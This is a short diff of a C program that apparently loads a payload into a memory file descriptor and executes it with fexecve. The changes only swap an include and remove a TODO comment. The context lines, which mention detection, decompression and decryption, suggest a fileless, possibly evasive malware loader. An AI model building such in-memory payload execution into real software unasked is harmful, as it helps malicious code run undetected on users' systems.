@@ -2,7 +2,7 @@
 #include <stdio.h>
 #include <unistd.h>
 #include <sys/mman.h>
-#include "detect.c"
+#include "detect.h"
 
 //#include <decompress.h>
 //#include <decrypt.h>
@@ -63,9 +63,7 @@ int main(int argc, char **argv){
         printf("Writing to mem_fd failed. %d bytes written when %d bytes were supposed to be written.\n", write_return_size, size);
         return -1;
     }
-    /*
-        TODO: The executed process inherits the loaders directory as current dir. Change to /
-    */
+    
     if (fexecve(payload_fd, (char * const *) payload_argv, (char * const *) payload_envp) == -1){ // execute payload
         puts("fexecve() failed");
     }
